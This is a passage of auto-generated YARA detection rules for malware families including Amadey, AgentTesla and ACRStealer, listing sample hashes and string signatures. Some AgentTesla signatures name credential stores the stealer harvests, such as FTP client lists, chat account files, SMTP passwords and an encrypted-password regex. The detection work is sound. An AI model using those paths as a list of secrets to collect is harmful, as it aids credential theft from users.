      description = "_subset_batch - from files a41097d27d1b14962ff14afe46b2196d(imphash).exe, Amadey(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "72ac8cc42df3b7e913a8424004a82c930388c5dd0641a7200840bae2722f467d"
      hash2 = "69e0d212862b36fc44f33e7a05d27b545db8e9d02d77e0770e5c947391ae7f78"
   strings:
      $x1 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x2 = "System.ComponentModel.ComponentConverter, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '34.00'*/
      $x3 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x4 = "System.ComponentModel.Design.IRootDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '34.00'*/
      $x5 = "System.Diagnostics.FileVersionInfo, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3avFxResources.System.Diagnos" ascii /* score: '31.00'*/
      $x6 = "System.Diagnostics.FileVersionInfo, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3avFxResources.System.Diagnos" ascii /* score: '31.00'*/
      $s7 = "System.CodeDom8Microsoft.Win32.SystemEvents\"SafeProcessHandle" fullword ascii /* score: '27.00'*/
      $s8 = "HSystem.ComponentModel.Primitives.dll$System.ObjectModel" fullword ascii /* score: '25.00'*/
      $s9 = "System.Collections.Generic.IEnumerator<System.Runtime.Loader.LibraryNameVariation>.get_Current@" fullword ascii /* score: '24.00'*/
      $s10 = "nicu.dll" fullword wide /* score: '23.00'*/
      $s11 = "System.Threading.Tasks.ITaskCompletionAction.get_InvokeMayRunArbitraryCode@" fullword ascii /* score: '22.00'*/
      $s12 = "System.dll$System.Collections" fullword ascii /* score: '22.00'*/
      $s13 = "DDetermineThreadPoolThreadTimeoutMs.get_HasForcedMinThreads.get_HasForcedMaxThreads4GetIOCompletionPollerCount,CreateIOCompletio" ascii /* score: '21.00'*/
      $s14 = "TargetDetailsFLockFreeReaderHashtableOfPointers`2" fullword ascii /* score: '20.00'*/
      $s15 = "XSystem.Collections.IEnumerable.GetEnumerator\"CopyStringContent" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2_8a7d7cc34c52dce3570005ebd59ab8b0_imphash__959833e_13 {
   meta:
      description = "_subset_batch - from files 83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2.elf, 8a7d7cc34c52dce3570005ebd59ab8b0(imphash).exe, 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae"
      hash2 = "3d16dc942ec08ee48cd4949c939cb0f62d1b21f5e34580691d7632b1748f81b9"
      hash3 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash4 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash5 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash6 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash7 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $s1 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s2 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s3 = "os/exec.Command" fullword ascii /* score: '24.00'*/
      $s4 = "*exec.Cmd" fullword ascii /* score: '20.00'*/
      $s5 = "os/exec.(*Cmd).Run" fullword ascii /* score: '20.00'*/
      $s6 = "os/exec.(*Cmd).writerDescriptor" fullword ascii /* score: '20.00'*/
      $s7 = "os/exec.(*Cmd).writerDescriptor.func1" fullword ascii /* score: '20.00'*/
      $s8 = "math.Log" fullword ascii /* score: '19.00'*/
      $s9 = "internal/testlog.Logger" fullword ascii /* score: '18.00'*/
      $s10 = "*func(*os.Process) error" fullword ascii /* score: '18.00'*/
      $s11 = "sync.(*RWMutex).RUnlock" fullword ascii /* score: '18.00'*/
      $s12 = "sync.(*RWMutex).rUnlockSlow" fullword ascii /* score: '18.00'*/
      $s13 = "net.UnknownNetworkError.Temporary" fullword ascii /* score: '17.00'*/
      $s14 = "os/exec.(*Cmd).Start.func2" fullword ascii /* score: '17.00'*/
      $s15 = "context.deadlineExceededError.Temporary" fullword ascii /* score: '17.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 21000KB and pe.imphash() == "8a7d7cc34c52dce3570005ebd59ab8b0" and ( 8 of them )
      ) or ( all of them )
}

rule _91f8b1bbcbf11338d823d9d6c8c7e089_imphash__ACRStealer_signature__6faee67a691b5510cdbffa2f65fadb6a_imphash__14 {
   meta:
      description = "_subset_batch - from files 91f8b1bbcbf11338d823d9d6c8c7e089(imphash).exe, ACRStealer(signature)_6faee67a691b5510cdbffa2f65fadb6a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "403e0c40a6eca112766379d8d1dd31dde3919d992f9f78b41f0e08fba440b4f5"
      hash2 = "30496079ebff4b88222a5d91611c8a7a8be8d86f9abd83814285db371b9b63df"
   strings:
      $s1 = "loader incomplete" fullword ascii /* score: '18.00'*/
      $s2 = "ossl_store_get0_loader_int" fullword ascii /* score: '18.00'*/
      $s3 = "log conf missing description" fullword ascii /* score: '17.00'*/
      $s4 = "process_include" fullword ascii /* score: '15.00'*/
      $s5 = "process_pci_value" fullword ascii /* score: '15.00'*/
      $s6 = "operation fail" fullword ascii /* score: '14.00'*/
      $s7 = "ambiguous host or service" fullword ascii /* score: '14.00'*/
      $s8 = "ssl command section not found" fullword ascii /* score: '14.00'*/
      $s9 = "malformed host or service" fullword ascii /* score: '14.00'*/
      $s10 = "log key invalid" fullword ascii /* score: '14.00'*/
      $s11 = "no hostname or service specified" fullword ascii /* score: '14.00'*/
      $s12 = "log conf missing key" fullword ascii /* score: '14.00'*/
      $s13 = "log conf invalid key" fullword ascii /* score: '14.00'*/
      $s14 = "ladder post failure" fullword ascii /* score: '14.00'*/
      $s15 = "ssl command section empty" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4a974b7f_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_15 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4a974b7f.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6ea4db06.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4a974b7fb576b2183acefabf17ef453bd4503e5d25e8e5853d56b9c8a9a8c3ff"
      hash2 = "6ea4db068135afc1c4b04d0942b9352405623cb8bf2a6d9a5fc3c4c04bb0cc28"
   strings:
      $s1 = "org.jdownloader.settings.AccountSettings.accounts.ejs" fullword wide /* score: '28.00'*/
      $s2 = "cmdvrt32.dll" fullword wide /* score: '26.00'*/
      $s3 = "\\Trillian\\users\\global\\accounts.dat" fullword wide /* score: '26.00'*/
      $s4 = "SxIn.dll" fullword wide /* score: '23.00'*/
      $s5 = "Software\\A.V.M.\\Paltalk NG\\common_settings\\core\\users\\creds\\" fullword wide /* score: '23.00'*/
      $s6 = "\\\"(hostname|encryptedPassword|encryptedUsername)\":\"(.*?)\"" fullword wide /* score: '23.00'*/
      $s7 = "SystemProcessorPerformanceInformation" fullword ascii /* score: '22.00'*/
      $s8 = "SmtpPassword" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s9 = "gnxLZ.exe" fullword wide /* score: '22.00'*/
      $s10 = "http://ip-api.com/line/?fields=hosting" fullword wide /* score: '22.00'*/
      $s11 = "\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt" fullword wide /* score: '22.00'*/
      $s12 = "\\VirtualStore\\Program Files (x86)\\FTP Commander\\Ftplist.txt" fullword wide /* score: '22.00'*/
      $s13 = "\\Program Files (x86)\\FTP Commander\\Ftplist.txt" fullword wide /* score: '22.00'*/
      $s14 = "\\VirtualStore\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt" fullword wide /* score: '22.00'*/
      $s15 = "SMTP Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__1418e44b536f42ef5db8fd35c961985c_imphash__AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imph_16 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_1418e44b536f42ef5db8fd35c961985c(imphash).exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dffbd774.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fb7e6164.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6fed0eeeb4e280c0539cbea3d9a2011f371f53fea295025d3e5f851eea25f4d6"
      hash2 = "dffbd774b50dd2319bff54a998b59872b1a5a2b7dcab844e7e0e6d00bd428af3"
      hash3 = "fb7e616458509e23902258b7679d2c3959cee8ebf03f77d0a443828394f2057f"
   strings:
      $x1 = "costura.guna.ui2.dll.compressed|2.0.4.7|Guna.UI2, Version=2.0.4.7, Culture=neutral, PublicKeyToken=8b9d14aa5142e261|Guna.UI2.dll" ascii /* score: '43.00'*/
      $x2 = "costura.costura.dll.compressed|6.0.0.0|Costura, Version=6.0.0.0, Culture=neutral, PublicKeyToken=9919ef960d84173d|Costura.dll|02" ascii /* score: '41.00'*/
      $x3 = "costura.costura.dll.compressed|6.0.0.0|Costura, Version=6.0.0.0, Culture=neutral, PublicKeyToken=9919ef960d84173d|Costura.dll|02" ascii /* score: '39.00'*/
      $x4 = "costura.guna.ui2.dll.compressed|2.0.4.7|Guna.UI2, Version=2.0.4.7, Culture=neutral, PublicKeyToken=8b9d14aa5142e261|Guna.UI2.dll" ascii /* score: '37.00'*/
      $s5 = "costura.costura.dll.compressed" fullword ascii /* score: '22.00'*/
      $s6 = "costura.guna.ui2.dll.compressed" fullword ascii /* score: '22.00'*/
      $s7 = "costura.costura.pdb.compressed|||Costura.pdb|806F4C19B2D7FD9E3B836269EC07647019A29E95|7960" fullword ascii /* score: '19.00'*/
      $s8 = "costura.costura.pdb.compressed" fullword ascii /* score: '17.00'*/
      $s9 = ".NETFramework,Version=v4.8" fullword ascii /* score: '10.00'*/
      $s10 = ".NET Framework 4.8" fullword ascii /* score: '10.00'*/
      $s11 = "get_DisabledState" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _ACRStealer_signature__02e1b72c33943071e9abb199bdcb6049_imphash__ACRStealer_signature__3c733b5675643aad72c3f03ebfb1a5b6_imph_17 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_02e1b72c33943071e9abb199bdcb6049(imphash).dll, ACRStealer(signature)_3c733b5675643aad72c3f03ebfb1a5b6(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "eb8c35e773b47b30dde4c798fda8b807e8adf762f41711b23edbb7bb877aba3f"
      hash2 = "97f2e0c674c235588e45511de542eb7538a24dfdc739299d41b34ade76410f2e"
   strings:
      $s1 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii /* score: '16.50'*/
      $s2 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii /* score: '16.50'*/
      $s3 = "SqlExec" fullword ascii /* score: '16.00'*/
      $s4 = "Wrong number of entries in %%%s table - expected %lld, actual %lld" fullword ascii /* score: '15.00'*/
      $s5 = "segdir" fullword ascii /* reversed goodware string 'ridges' */ /* score: '15.00'*/
      $s6 = "max rootpage (%d) disagrees with header (%d)" fullword ascii /* score: '15.00'*/
      $s7 = "Mapping (%lld -> %lld) missing from %s table" fullword ascii /* score: '14.00'*/
      $s8 = "DROP TABLE IF EXISTS %Q.'%q_segments';DROP TABLE IF EXISTS %Q.'%q_segdir';DROP TABLE IF EXISTS %Q.'%q_docsize';DROP TABLE IF EXI" ascii /* score: '14.00'*/
      $s9 = "target object/alias may not appear in FROM clause: %s" fullword ascii /* score: '14.00'*/
      $s10 = "STS %Q.'%q_stat';%s DROP TABLE IF EXISTS %Q.'%q_content';" fullword ascii /* score: '14.00'*/
      $s11 = "UPDATE %Q.sqlite_master SET type='%s', name=%Q, tbl_name=%Q, rootpage=#%d, sql=%Q WHERE rowid=#%d" fullword ascii /* score: '12.50'*/
      $s12 = "REINDEXEDESCAPEACHECKEYBEFOREIGNOREGEXPLAINSTEADDATABASELECTABLEFTHENDEFERRABLELSEXCLUDELETEMPORARYISNULLSAVEPOINTERSECTIESNOTNU" ascii /* score: '12.50'*/
      $s13 = "USING ROWID SEARCH ON TABLE %s FOR IN-OPERATOR" fullword ascii /* score: '12.00'*/
      $s14 = "SQL logic error" fullword ascii /* score: '12.00'*/
      $s15 = "Found (%lld -> %lld) in %s table, expected (%lld -> %lld)" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _837fe6c9e243ff99b6590b36278aa82c_imphash__a41097d27d1b14962ff14afe46b2196d_imphash__AgentTesla_signature__6d242744_AgentTes_18 {
   meta:
      description = "_subset_batch - from files 837fe6c9e243ff99b6590b36278aa82c(imphash).exe, a41097d27d1b14962ff14afe46b2196d(imphash).exe, AgentTesla(signature)_6d242744.tar, AgentTesla(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, Amadey(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "da061f2bdb2a6d84d3e7d6b2045834655fe65418e9ad7281b4b689a3700dc003"
      hash2 = "72ac8cc42df3b7e913a8424004a82c930388c5dd0641a7200840bae2722f467d"
      hash3 = "6d242744cbee7249a48505d1447d984e9c912b904be4ea3dcccd07602ef5264d"
      hash4 = "7b3d435d322d7303446c5ce3308704a1d4d5a5b1e70abb44a19502be6baf2c79"
      hash5 = "69e0d212862b36fc44f33e7a05d27b545db8e9d02d77e0770e5c947391ae7f78"
   strings:
      $x1 = "System.ComponentModel.Design.IDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" fullword wide /* score: '34.00'*/
      $x2 = "System.Diagnostics.Design.ProcessModuleDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" ascii /* score: '32.00'*/
      $x3 = "System.Diagnostics.Design.ProcessModuleDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" ascii /* score: '32.00'*/
      $x4 = "System.Diagnostics.Design.ProcessDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '32.00'*/
      $x5 = "<System.Diagnostics.Process.dll" fullword ascii /* score: '31.00'*/
      $s6 = "LSystem.Diagnostics.FileVersionInfo.dll4System.Diagnostics.Process" fullword ascii /* score: '30.00'*/
      $s7 = "DeleteTimerXSystem.Threading.IThreadPoolWorkItem.Execute" fullword ascii /* score: '25.00'*/
      $s8 = "BSystem.Collections.NonGeneric.dll@System.ComponentModel.Primitives" fullword ascii /* score: '25.00'*/
      $s9 = "BTryEnsureSufficientExecutionStack.GetSufficientStackLimit" fullword ascii /* score: '24.00'*/
      $s10 = "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e0892ArrayListEnumeratorSimple" fullword ascii /* score: '24.00'*/
      $s11 = "System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '24.00'*/
      $s12 = "FinishStageTwo FinishStageThreeJNotifyParentIfPotentiallyAttachedTask,ProcessChildCompletion@" fullword ascii /* score: '23.00'*/
      $s13 = "8Microsoft.Win32.Registry.dll" fullword ascii /* score: '23.00'*/
      $s14 = "BSystem.Collections.Concurrent.dll:System.Collections.NonGeneric" fullword ascii /* score: '22.00'*/
      $s15 = "BTransitionToCancellationRequested.ExecuteCallbackHandlers" fullword ascii /* score: '21.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x7061 ) and filesize < 12000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2_8a7d7cc34c52dce3570005ebd59ab8b0_imphash__959833e_19 {
   meta:
      description = "_subset_batch - from files 83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2.elf, 8a7d7cc34c52dce3570005ebd59ab8b0(imphash).exe, 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_04537b68.exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_4cfe5a07.exe, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae"
      hash2 = "3d16dc942ec08ee48cd4949c939cb0f62d1b21f5e34580691d7632b1748f81b9"
      hash3 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash4 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash5 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash6 = "1005065810ae3c06e48ea42e790775bd003451a8aea76a25331cbe9a55f701f2"
      hash7 = "04537b68ef029a66a16e85052f829b6f6cc969fefe894e0c55f8048cc5ad74a6"
      hash8 = "4cfe5a076f8b5aeedafccaff49969c10d09468bbb795075099f10974248c23f8"
      hash9 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash10 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $s1 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s10 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s11 = "runtime.(*rwmutex).rlock.func1" fullword ascii /* score: '18.00'*/
      $s12 = "runtime.envKeyEqual" fullword ascii /* score: '18.00'*/
      $s13 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
      $s14 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s15 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 21000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__43a642ab_Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imp_20 {
   meta:
      description = "_subset_batch - from files Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_43a642ab.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6bb682e1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "43a642abc27818626bc6eec933a6d4419fb77a38b4d66dc2b05e62b406a2a56b"
      hash2 = "6bb682e11569f217274226cfe7112c52ca3987547139da4709e1d5ba2c97f042"
   strings:
      $s1 = ",4- -V-" fullword ascii /* score: '9.00'*/
      $s2 = "#* W v _!" fullword ascii /* score: '9.00'*/
      $s3 = "- -T-@-" fullword ascii /* score: '9.00'*/
      $s4 = "jCjK@*.(XU[xj]u\"*t,MNBqscV:Ku|v+@C:WB~I*YQONRwWUIRcOCu'" fullword ascii /* score: '9.00'*/
      $s5 = "#>#6#\"#B#~#" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s6 = " - [ Q x v " fullword ascii /* score: '9.00'*/
      $s7 = "\";\"7\"#\"C\"" fullword ascii /* score: '9.00'*/ /* hex encoded string '|' */
      $s8 = "afefefeffehah" fullword ascii /* score: '8.00'*/
      $s9 = "$(% %^%i%g%" fullword ascii /* score: '8.00'*/
      $s10 = "iyhsjnuh" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _9a22a70923e9ecf4c33acc09bc0bd89e_imphash__ae151cdc3fe6136b55de5342f7988742_imphash__21 {
   meta:
      description = "_subset_batch - from files 9a22a70923e9ecf4c33acc09bc0bd89e(imphash).exe, ae151cdc3fe6136b55de5342f7988742(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9bd1860a8f5064fe3c22321982af2ff8b951ec829e6a29636aafa0ea2773810c"
      hash2 = "60cf00fd6cc017ede9a878e8dee626aa7317c7e6baae83d6e52dfe485c276aef"
   strings:
      $x1 = "blyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" publicKe" ascii /* score: '36.00'*/
      $s2 = "<assemblyIdentity name=\"E.App\" processorArchitecture=\"x86\" version=\"5.2.0.0\" type=\"win32\"/><dependency><dependentAssembl" ascii /* score: '22.00'*/
      $s3 = "(http://www.eyuyan.com)" fullword wide /* score: '17.00'*/
      $s4 = "ity>        <requestedPrivileges>            <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/>       " ascii /* score: '14.00'*/
      $s5 = "GetTabList" fullword ascii /* score: '9.00'*/
      $s6 = "GetConnectString" fullword ascii /* score: '9.00'*/
      $s7 = "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)" fullword ascii /* score: '9.00'*/
      $s8 = " but running with " fullword ascii /* score: '9.00'*/
      $s9 = "nzzpenc" fullword ascii /* score: '8.00'*/
      $s10 = "bcdfghijklmnpqrstuvwxyz" fullword ascii /* score: '8.00'*/
      $s11 = "hgjlkbrfzaoe" fullword ascii /* score: '8.00'*/
      $s12 = " (*.txt)|*.txt|" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _918ff11c0924d51456268c0b6879b18be4a5dd5e344690abb007ddbe908d46d6_918ff11c_a11fbaa19e73ee129d22ca97116d8d67033de8f6b74ff328b_22 {
   meta:
      description = "_subset_batch - from files 918ff11c0924d51456268c0b6879b18be4a5dd5e344690abb007ddbe908d46d6_918ff11c.js, a11fbaa19e73ee129d22ca97116d8d67033de8f6b74ff328baf3666b1aab8201_a11fbaa1.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "918ff11c0924d51456268c0b6879b18be4a5dd5e344690abb007ddbe908d46d6"
      hash2 = "a11fbaa19e73ee129d22ca97116d8d67033de8f6b74ff328baf3666b1aab8201"
   strings:
      $s1 = "iframe.src=\"javascript:\";" fullword ascii /* score: '25.00'*/
      $s2 = "var compliantExecNpcg=/()??/.exec(\"\")[1]===void 0;" fullword ascii /* score: '23.00'*/
      $s3 = "descriptor.get=getter;" fullword ascii /* score: '21.00'*/
      $s4 = "if(!compliantExecNpcg&&match.length>1){" fullword ascii /* score: '19.00'*/
      $s5 = "if(!compliantExecNpcg){" fullword ascii /* score: '19.00'*/
      $s6 = "Object.getOwnPropertyDescriptor=function(object,property){" fullword ascii /* score: '18.00'*/
      $s7 = "defineGetter(object,property,descriptor.get);" fullword ascii /* score: '18.00'*/
      $s8 = "var boundLength=Math.max(0,target.length-args.length);" fullword ascii /* score: '17.00'*/
      $s9 = "throw new TypeError(ERR_NON_OBJECT_TARGET+object);" fullword ascii /* score: '17.00'*/
      $s10 = "Empty.prototype=target.prototype;" fullword ascii /* score: '17.00'*/
      $s11 = "throw new TypeError(\"Function.prototype.bind called on incompatible \"+target);" fullword ascii /* score: '16.00'*/
      $s12 = "descriptor.set=setter;" fullword ascii /* score: '16.00'*/
      $s13 = "var match=isoDateExpression.exec(string);" fullword ascii /* score: '16.00'*/
      $s14 = "while(match=separator.exec(string)){" fullword ascii /* score: '16.00'*/
      $s15 = "var doesGetOwnPropertyDescriptorWork=function(object){" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _8a7d7cc34c52dce3570005ebd59ab8b0_imphash__9cbefe68f395e67356e2a5d8d1b285c0_imphash__9cbefe68f395e67356e2a5d8d1b285c0_imphas_23 {
   meta:
      description = "_subset_batch - from files 8a7d7cc34c52dce3570005ebd59ab8b0(imphash).exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_04537b68.exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_4cfe5a07.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3d16dc942ec08ee48cd4949c939cb0f62d1b21f5e34580691d7632b1748f81b9"
      hash2 = "1005065810ae3c06e48ea42e790775bd003451a8aea76a25331cbe9a55f701f2"
      hash3 = "04537b68ef029a66a16e85052f829b6f6cc969fefe894e0c55f8048cc5ad74a6"
      hash4 = "4cfe5a076f8b5aeedafccaff49969c10d09468bbb795075099f10974248c23f8"
   strings:
      $s1 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s3 = "l32.dll" fullword ascii /* score: '20.00'*/
      $s4 = "i32.dll" fullword ascii /* score: '20.00'*/
      $s5 = "syscall.procGetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s6 = "syscall.procGetProcessTimes" fullword ascii /* score: '19.00'*/
      $s7 = "syscall.procGetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s8 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s9 = "syscall.procGetCurrentProcessId" fullword ascii /* score: '19.00'*/
      $s10 = "runtime/rwmutex.go" fullword ascii /* score: '18.00'*/
      $s11 = "runtime.getlasterror" fullword ascii /* score: '18.00'*/
      $s12 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s13 = "syscall.procOpenProcessToken" fullword ascii /* score: '17.00'*/
      $s14 = "_32.dll" fullword ascii /* score: '17.00'*/
      $s15 = "SystemFuH" fullword ascii /* base64 encoded string 'K+-zan' */ /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Amadey_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__Amadey_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__b0d_24 {
   meta:
